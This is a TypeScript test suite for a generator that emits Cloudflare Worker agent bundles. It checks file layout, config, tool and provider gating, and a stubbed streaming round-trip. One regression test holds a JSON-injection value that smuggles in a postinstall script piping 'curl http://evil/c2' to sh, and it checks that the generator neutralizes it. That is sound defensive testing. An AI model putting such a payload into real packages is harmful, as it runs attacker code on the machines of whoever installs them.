import { describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import type { IrV0 } from "@crewhaus/ir";
import { TargetEmitError, emitCfWorkerCli, resolveEdgeTools } from "./index";

/**
 * Loop contract 0.4 (Batch F, G12/G83) — the cf-worker CLI emitter now runs
 * the SHARED `@crewhaus/worker-runtime` loop instead of a bespoke inlined
 * Anthropic client. These tests (1) pin the generated wiring at the source
 * level, (2) BUILD the emitted worker to prove it transpiles — and, tools-free,
 * stays node-free (the payoff of G12) — and (3) EXECUTE it against a stubbed
 * Anthropic transport to prove a real tool round-trip runs and the `/chat`
 * `text`/`done`/`error` SSE stays byte-compatible.
 *
 * (2) and (3) run the emitted worker in a `bun` SUBPROCESS: the emitted worker
 * imports `@crewhaus/*` workspace packages, and `bun test`'s bundler/loader
 * resolves this repo's isolated (per-package) node_modules differently than a
 * plain `bun run`, so the build + drive happen in a real `bun run` context.
 */

const SRC_DIR = import.meta.dir;

const workerCode = (ir: IrV0): string =>
  emitCfWorkerCli(ir).files.find((f) => f.path === "worker.js")?.content ?? "";

const baseIr: IrV0 = {
  version: 0,
  name: "hello-cli",
  target: "cli",
  agent: {
    model: "claude-haiku-4-5-20251001",
    instructions: "You are a helpful assistant.",
  },
  tools: [],
  toolConfigs: Object.freeze({}),
  mcp_servers: Object.freeze({}),
  permissions: { rules: [] },
  subAgents: [],
  compaction: {},
};

// --- subprocess harness ------------------------------------------------------

/** Runs INSIDE a `bun` subprocess: builds or drives the emitted worker and
 *  prints a JSON result. `job.json` + `worker.mjs` sit beside it in a temp dir
 *  under this package (so the worker's `@crewhaus/*` imports resolve). */
const DRIVER_SRC = String.raw`
import { fileURLToPath } from "node:url";
const here = fileURLToPath(new URL(".", import.meta.url));
const job = JSON.parse(await Bun.file(here + "job.json").text());
const workerPath = here + "worker.mjs";
const result = {};
try {
  if (job.mode === "build") {
    const b = await Bun.build({ entrypoints: [workerPath], target: job.buildTarget });
    result.success = b.success;
    if (b.success) {
      const t = (await Promise.all(b.outputs.map((o) => o.text()))).join("\n");
      result.nodeFree = !/["']node:/.test(t);
      result.bytes = t.length;
      if (job.expectContains) result.contains = t.includes(job.expectContains);
    } else {
      result.logs = b.logs.map(String);
    }
  } else {
    let calls = 0;
    globalThis.fetch = async (url) => {
      if (String(url).includes("api.anthropic.com")) {
        const turn = job.turns[calls] ?? [];
        calls += 1;
        const enc = new TextEncoder();
        const body = new ReadableStream({
          start(c) {
            for (const o of turn) c.enqueue(enc.encode("event: " + o.type + "\ndata: " + JSON.stringify(o) + "\n\n"));
            c.close();
          },
        });
        return new Response(body, { status: 200, headers: { "content-type": "text/event-stream" } });
      }
      return new Response("unexpected", { status: 500 });
    };
    const worker = (await import(workerPath)).default;
    const req = new Request("https://harness.example/chat", {
      method: "POST",
      headers: { "content-type": "application/json", origin: "https://studio.crewhaus.ai" },
      body: JSON.stringify(job.body ?? { messages: [{ role: "user", content: "hi" }] }),
    });
    const res = await worker.fetch(req, { ANTHROPIC_API_KEY: "sk-test" });
    result.status = res.status;
    result.raw = await res.text();
    result.calls = calls;
  }
} catch (e) {
  result.error = e && e.message ? e.message : String(e);
}
process.stdout.write(JSON.stringify(result));
`;

type BuildResult = {
  success: boolean;
  nodeFree?: boolean;
  bytes?: number;
  contains?: boolean;
  logs?: string[];
  error?: string;
};
type DriveResult = { status: number; raw: string; calls: number; error?: string };

async function runJob(
  code: string,
  job: Record<string, unknown>,
): Promise<BuildResult & DriveResult> {
  const dir = mkdtempSync(join(SRC_DIR, ".cfw-run-"));
  writeFileSync(join(dir, "worker.mjs"), code);
  writeFileSync(join(dir, "job.json"), JSON.stringify(job));
  writeFileSync(join(dir, "driver.mjs"), DRIVER_SRC);
  try {
    const proc = Bun.spawn([process.execPath, join(dir, "driver.mjs")], {
      stdout: "pipe",
      stderr: "pipe",
    });
    const out = await new Response(proc.stdout).text();
    const err = await new Response(proc.stderr).text();
    await proc.exited;
    if (!out) throw new Error(`driver produced no output; stderr:\n${err}`);
    return JSON.parse(out);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

// --- scripted Anthropic turns ------------------------------------------------

type Frame = Record<string, unknown>;

function textTurn(
  text: string,
  opts: { input?: number; output?: number; stopReason?: string } = {},
): Frame[] {
  return [
    {
      type: "message_start",
      message: { usage: { input_tokens: opts.input ?? 10, output_tokens: 1 } },
    },
    { type: "content_block_start", index: 0, content_block: { type: "text", text: "" } },
    { type: "content_block_delta", index: 0, delta: { type: "text_delta", text } },
    { type: "content_block_stop", index: 0 },
    {
      type: "message_delta",
      delta: { stop_reason: opts.stopReason ?? "end_turn" },
      usage: { output_tokens: opts.output ?? 5 },
    },
    { type: "message_stop" },
  ];
}

function toolTurn(id: string, name: string, input: Record<string, unknown>): Frame[] {
  return [
    { type: "message_start", message: { usage: { input_tokens: 10, output_tokens: 1 } } },
    {
      type: "content_block_start",
      index: 0,
      content_block: { type: "tool_use", id, name, input: {} },
    },
    {
      type: "content_block_delta",
      index: 0,
      delta: { type: "input_json_delta", partial_json: JSON.stringify(input) },
    },
    { type: "content_block_stop", index: 0 },
    { type: "message_delta", delta: { stop_reason: "tool_use" }, usage: { output_tokens: 3 } },
    { type: "message_stop" },
  ];
}

type SseEvent = { name: string; data: Record<string, unknown> };
function parseSse(raw: string): SseEvent[] {
  const out: SseEvent[] = [];
  for (const block of raw.split("\n\n")) {
    if (!block.trim()) continue;
    let name = "message";
    let data = "";
    for (const line of block.split("\n")) {
      if (line.startsWith("event: ")) name = line.slice(7);
      else if (line.startsWith("data: ")) data += line.slice(6);
    }
    if (data) out.push({ name, data: JSON.parse(data) as Record<string, unknown> });
  }
  return out;
}

// --- bundle shape ------------------------------------------------------------

describe("emitCfWorkerCli — bundle shape", () => {
  test("emits worker.js, wrangler.toml, package.json, and the generated README (item 42)", () => {
    const bundle = emitCfWorkerCli(baseIr);
    const paths = bundle.files.map((f) => f.path).sort();
    expect(paths).toEqual(["README.md", "package.json", "worker.js", "wrangler.toml"]);
    const readme = bundle.files.find((f) => f.path === "README.md")?.content ?? "";
    expect(readme).toContain("wrangler deploy");
    expect(readme).not.toContain("bun agent.ts");
  });

  test("readme: false restores the three-file bundle (item 42 opt-out)", () => {
    const bundle = emitCfWorkerCli(baseIr, { readme: false });
    expect(bundle.files.map((f) => f.path).sort()).toEqual([
      "package.json",
      "worker.js",
      "wrangler.toml",
    ]);
  });

  test("worker.js runs the shared runtime and inlines model + instructions", () => {
    const worker = workerCode(baseIr);
    expect(worker).toContain('from "@crewhaus/worker-runtime"');
    expect(worker).toContain("runWorkerLoop");
    expect(worker).toContain("createEdgeAnthropicAdapter");
    expect(worker).not.toContain("api.anthropic.com"); // moved into the shared adapter
    expect(worker).toContain("claude-haiku-4-5-20251001");
    expect(worker).toContain("You are a helpful assistant.");
    expect(worker).toContain("const TOOLS = [];");
  });

  test("wrangler.toml uses sanitized spec name + keeps nodejs_compat", () => {
    const ir: IrV0 = { ...baseIr, name: "Hello World!" };
    const wrangler =
      emitCfWorkerCli(ir).files.find((f) => f.path === "wrangler.toml")?.content ?? "";
    expect(wrangler).toContain('name = "hello-world-"');
    expect(wrangler).toContain('compatibility_flags = ["nodejs_compat"]');
  });

  // Regression — issue #148 (CWE-94). A raw ir.name in package.json could break
  // out of the JSON string and inject a postinstall script.
  test("package.json sanitizes the spec name and resists JSON injection", () => {
    const ir: IrV0 = {
      ...baseIr,
      name: '", "scripts": { "postinstall": "curl http://evil/c2 | sh" }, "x": "',
    };
    const pkg = emitCfWorkerCli(ir).files.find((f) => f.path === "package.json");
    expect(pkg).toBeDefined();
    const parsed = JSON.parse(pkg?.content ?? "") as {
      name: string;
      scripts: Record<string, string>;
    };
    expect(parsed.name).not.toContain('"');
    expect(parsed.scripts["postinstall"]).toBeUndefined();
    expect(parsed.scripts).toEqual({ deploy: "wrangler deploy", dev: "wrangler dev --local" });
  });

  test("package.json declares the runtime dependency (needed for the deploy bundle)", () => {
    const pkg = emitCfWorkerCli(baseIr).files.find((f) => f.path === "package.json")?.content ?? "";
    const deps = (JSON.parse(pkg) as { dependencies: Record<string, string> }).dependencies;
    expect(deps["@crewhaus/worker-runtime"]).toBeDefined();
    expect(Object.keys(deps)).toEqual(["@crewhaus/worker-runtime"]);
  });

  test("worker.js escapes special characters in instructions", () => {
    const ir: IrV0 = {
      ...baseIr,
      agent: { ...baseIr.agent, instructions: 'Respond with "quoted" text\nand newlines.' },
    };
    const worker = workerCode(ir);
    expect(worker).toContain('\\"quoted\\"');
    expect(worker).toContain("\\n");
  });

  test("rejects non-cli IR variants", () => {
    const wrong = { ...baseIr, target: "workflow" } as unknown as IrV0;
    expect(() => emitCfWorkerCli(wrong)).toThrow(TargetEmitError);
  });

  const parseJs = (code: string) => new Bun.Transpiler({ loader: "js" }).transformSync(code);

  test("worker.js is syntactically valid ES module", () => {
    expect(() => parseJs(workerCode(baseIr))).not.toThrow();
  });

  test("worker.js stays valid with hyphenated name and tricky instructions", () => {
    const ir: IrV0 = {
      ...baseIr,
      name: "hello-cli",
      agent: {
        ...baseIr.agent,
        instructions: 'Quotes "here", a newline\nhere, a ${dollar} and a ` backtick.',
      },
    };
    expect(() => parseJs(workerCode(ir))).not.toThrow();
  });
});

// --- config threading --------------------------------------------------------

describe("emitCfWorkerCli — config threading", () => {
  test("agent.max_tokens / thinking / limits bake into the loop options", () => {
    const ir: IrV0 = {
      ...baseIr,
      agent: { ...baseIr.agent, maxTokens: 8192, thinking: { effort: "high" } },
      limits: { maxToolIterations: 12, contextLimit: 50_000, deadlineMs: 30_000 },
    };
    const worker = workerCode(ir);
    expect(worker).toContain("maxTokens: 8192");
    expect(worker).toContain('thinking: {"effort":"high"}');
    expect(worker).toContain(
      'limits: {"maxToolIterations":12,"contextLimit":50000,"deadlineMs":30000}',
    );
  });

  test("absent limits/thinking bake as undefined and default max_tokens to 4096", () => {
    const worker = workerCode(baseIr);
    expect(worker).toContain("maxTokens: 4096");
    expect(worker).toContain("thinking: undefined");
    expect(worker).toContain("limits: undefined");
  });

  test("loop-detection justify escalation degrades to warn on the edge", () => {
    const ir: IrV0 = {
      ...baseIr,
      limits: { loopDetection: { window: 6, threshold: 3, escalation: "justify" } },
    };
    expect(workerCode(ir)).toContain(
      '"loopDetection":{"window":6,"threshold":3,"escalation":"warn"}',
    );
  });
});

// --- edge-safe tool gate -----------------------------------------------------

describe("resolveEdgeTools — the cf-worker tool gate (G12/G83)", () => {
  test("host tools throw a clear compile error", () => {
    expect(() => resolveEdgeTools(["read", "bash"], {})).toThrow(TargetEmitError);
    expect(() => resolveEdgeTools(["read", "bash"], {})).toThrow(
      /cf-worker target cannot run 2 host tool\(s\)/,
    );
  });

  test("emitCfWorkerCli rejects host tools too (gate wired into the emitter)", () => {
    expect(() => emitCfWorkerCli({ ...baseIr, tools: ["python"] })).toThrow(
      /cf-worker target cannot run 1 host tool/,
    );
  });

  test("every edge-safe builtin wires to a real tool factory", () => {
    const wiring = resolveEdgeTools(
      ["fetch", "webFetch", "webSearch", "sendMessage", "imageGenerate", "todoWrite"],
      {},
    );
    expect(wiring.unwired).toEqual([]);
    expect(wiring.toolsExpr).toBe(
      "[__t_fetch, __t_webFetch, __t_webSearch, __t_sendMessage, __t_imageGenerate, __t_todoWrite]",
    );
    expect(wiring.imports).toContain("fetch as __t_fetch"); // never shadows global fetch
    expect(wiring.imports).toContain('from "@crewhaus/tool-fetch"');
    expect(wiring.packages).toContain("@crewhaus/tool-web");
    // per-package grouping: webFetch + webSearch share one import line.
    expect(wiring.imports.match(/@crewhaus\/tool-web/g)?.length).toBe(1);
  });

  test("tool_config for an edge tool emits its init call", () => {
    const wiring = resolveEdgeTools(["fetch"], { fetch: { allowedHosts: ["api.example.com"] } });
    expect(wiring.imports).toContain("registerFetchConfig");
    expect(wiring.inits).toContain('registerFetchConfig({"allowedHosts":["api.example.com"]})');
  });

  test("mcp__* and unrecognised custom tools are permitted but left unwired", () => {
    const wiring = resolveEdgeTools(["mcp__srv__do", "myCustomThing", "fetch"], {});
    expect(wiring.toolsExpr).toBe("[__t_fetch]");
    expect(wiring.unwired).toEqual(["mcp__srv__do", "myCustomThing"]);
  });

  test("a spec with unwired tools surfaces a generated note comment", () => {
    const worker = workerCode({ ...baseIr, tools: ["myCustomThing"] });
    expect(worker).toContain("permitted but not wired on this edge worker");
    expect(worker).toContain("myCustomThing");
  });

  test("edge-safe tool packages are declared in the bundle package.json", () => {
    const pkg =
      emitCfWorkerCli({ ...baseIr, tools: ["webSearch", "todoWrite"] }).files.find(
        (f) => f.path === "package.json",
      )?.content ?? "";
    const deps = (JSON.parse(pkg) as { dependencies: Record<string, string> }).dependencies;
    expect(deps["@crewhaus/worker-runtime"]).toBeDefined();
    expect(deps["@crewhaus/tool-web"]).toBeDefined();
    expect(deps["@crewhaus/tool-todo"]).toBeDefined();
  });
});

// --- provider gate -----------------------------------------------------------

describe("emitCfWorkerCli — provider gate", () => {
  test("an openai/ spec fails at compile time with the cf-worker hint", () => {
    const ir: IrV0 = { ...baseIr, agent: { ...baseIr.agent, model: "openai/gpt-4o-mini" } };
    expect(() => emitCfWorkerCli(ir)).toThrow(
      /cf-worker targets currently support claude-\* models only — use the cli target for other providers/,
    );
    expect(() => emitCfWorkerCli(ir)).toThrow(/openai/);
  });

  test("gemini/, bedrock/, and local/ specs are all rejected", () => {
    for (const model of [
      "gemini/gemini-2.5-flash",
      "bedrock/us.anthropic.claude-sonnet-4-5-20250929-v1:0",
      "local/llama3.2@http://localhost:11434/v1",
    ]) {
      const ir: IrV0 = { ...baseIr, agent: { ...baseIr.agent, model } };
      expect(() => emitCfWorkerCli(ir)).toThrow(TargetEmitError);
    }
  });

  test("an unparseable model string surfaces as TargetEmitError, not a raw ConfigError", () => {
    const ir: IrV0 = { ...baseIr, agent: { ...baseIr.agent, model: "gpt-4o-mini" } };
    expect(() => emitCfWorkerCli(ir)).toThrow(TargetEmitError);
    expect(() => emitCfWorkerCli(ir)).toThrow(/unrecognised model string/);
  });

  test("claude-* models still emit cleanly", () => {
    expect(emitCfWorkerCli(baseIr).files.length).toBe(4);
  });
});

describe("emitCfWorkerCli — failure_taxonomy ignored-note (item 23)", () => {
  test("worker.js carries the ignored-taxonomy note when the spec declares one", () => {
    const ir: IrV0 = {
      ...baseIr,
      failureTaxonomy: [{ class: "rate_limited", pattern: "/429/", recovery: "retry" }],
    };
    expect(workerCode(ir)).toContain(
      "failure_taxonomy configured but target-cf-worker-cli does not wire it up",
    );
  });

  test("no note when the spec omits failure_taxonomy", () => {
    expect(workerCode(baseIr)).not.toContain("failure_taxonomy configured");
  });
});

// --- the emitted worker builds (payoff of G12) -------------------------------

describe("emitCfWorkerCli — the emitted worker builds", () => {
  test("a tools-free worker bundles for the edge with ZERO node: specifiers", async () => {
    const r = await runJob(workerCode(baseIr), { mode: "build", buildTarget: "browser" });
    expect(r.error).toBeUndefined();
    expect(r.success, JSON.stringify(r.logs)).toBe(true);
    expect(r.nodeFree).toBe(true);
  });

  test("a worker with an edge-safe tool transpiles with the tool wired in", async () => {
    const r = await runJob(workerCode({ ...baseIr, tools: ["todoWrite"] }), {
      mode: "build",
      buildTarget: "node",
      expectContains: "TodoWrite",
    });
    expect(r.error).toBeUndefined();
    expect(r.success, JSON.stringify(r.logs)).toBe(true);
    expect(r.contains).toBe(true);
  });
});

// --- SSE frames: byte-compatible /chat + Batch C trace through the runtime ---

describe("emitCfWorkerCli — /chat SSE through the shared runtime", () => {
  test("a text-only turn keeps text/done byte-compatible and emits the trace vocabulary", async () => {
    const r = await runJob(workerCode(baseIr), { mode: "drive", turns: [textTurn("Hello")] });
    expect(r.error).toBeUndefined();
    expect(r.calls).toBe(1);
    const events = parseSse(r.raw);

    const text = events.filter((e) => e.name === "text");
    expect(text.map((e) => e.data["text"]).join("")).toBe("Hello");
    expect(events.find((e) => e.name === "done")?.data).toEqual({
      text: "Hello",
      stopReason: "end_turn",
    });

    const kinds = events.filter((e) => e.name === "trace").map((e) => e.data["kind"]);
    expect(kinds).toContain("turn_start");
    expect(kinds).toContain("model_request");
    expect(kinds).toContain("model_response");
    expect(kinds).toContain("cost_accrual");
    expect(kinds).toContain("turn_end");

    const resp = events.find((e) => e.name === "trace" && e.data["kind"] === "model_response")
      ?.data as { model: string; usage: Record<string, number>; stopReason: string };
    expect(resp.model).toBe("claude-haiku-4-5-20251001");
    expect(resp.usage.input).toBe(10);
    expect(resp.usage.output).toBe(5);
    expect(resp.stopReason).toBe("end_turn");

    const cost = events.find((e) => e.name === "trace" && e.data["kind"] === "cost_accrual")?.data;
    expect(cost).toMatchObject({
      kind: "cost_accrual",
      provider: "anthropic",
      modelId: "claude-haiku-4-5-20251001",
      inputTokens: 10,
      outputTokens: 5,
      costUsdMicros: 0,
      unpriced: true,
    });
  });

  test("a REAL tool round-trip runs through the loop (tool_call frames + two model calls)", async () => {
    const r = await runJob(workerCode({ ...baseIr, tools: ["todoWrite"] }), {
      mode: "drive",
      turns: [
        toolTurn("tu_1", "TodoWrite", {
          todos: [{ id: "1", content: "ship it", status: "pending", priority: "high" }],
        }),
        textTurn("all done"),
      ],
    });
    expect(r.error).toBeUndefined();
    expect(r.calls).toBe(2); // one tool round-trip: tool_use → tool_result → text
    const events = parseSse(r.raw);
    const kinds = events.filter((e) => e.name === "trace").map((e) => e.data["kind"]);
    expect(kinds).toContain("tool_call_start");
    expect(kinds).toContain("tool_call_end");
    const toolEnd = events.find((e) => e.name === "trace" && e.data["kind"] === "tool_call_end")
      ?.data as { toolName: string; isError: boolean };
    expect(toolEnd.toolName).toBe("TodoWrite");
    expect(toolEnd.isError).toBe(false);
    expect(events.find((e) => e.name === "done")?.data).toEqual({
      text: "all done",
      stopReason: "end_turn",
    });
  });

  test("model_response precedes done so the studio host sees usage before the terminal", async () => {
    const r = await runJob(workerCode(baseIr), { mode: "drive", turns: [textTurn("Hi")] });
    const events = parseSse(r.raw);
    const doneIdx = events.findIndex((e) => e.name === "done");
    const respIdx = events.findIndex(
      (e) => e.name === "trace" && e.data["kind"] === "model_response",
    );
    expect(respIdx).toBeGreaterThanOrEqual(0);
    expect(respIdx).toBeLessThan(doneIdx);
  });

  test("observability.trace: off emits NO trace frames (text/done still flow)", async () => {
    const ir: IrV0 = { ...baseIr, observability: { trace: { level: "off" } } };
    expect(workerCode(ir)).toContain("trace: false");
    const r = await runJob(workerCode(ir), { mode: "drive", turns: [textTurn("Hello")] });
    const events = parseSse(r.raw);
    expect(events.some((e) => e.name === "trace")).toBe(false);
    expect(events.find((e) => e.name === "done")?.data).toEqual({
      text: "Hello",
      stopReason: "end_turn",
    });
  });

  test("observability.trace: pretty (and the default absence) bake trace ON", () => {
    expect(workerCode(baseIr)).toContain("trace: true");
    expect(workerCode({ ...baseIr, observability: { trace: { level: "pretty" } } })).toContain(
      "trace: true",
    );
    expect(workerCode({ ...baseIr, observability: {} })).toContain("trace: true");
  });

  test("a context overflow ends the run with a classified error frame (no compaction on the edge)", async () => {
    const ir: IrV0 = { ...baseIr, limits: { contextLimit: 1 } };
    const r = await runJob(workerCode(ir), { mode: "drive", turns: [textTurn("never reached")] });
    const events = parseSse(r.raw);
    expect(events.some((e) => e.name === "done")).toBe(false);
    const err = events.find((e) => e.name === "error");
    expect(err).toBeDefined();
    expect(String(err?.data["message"])).toMatch(/context window exceeded/i);
  });
});
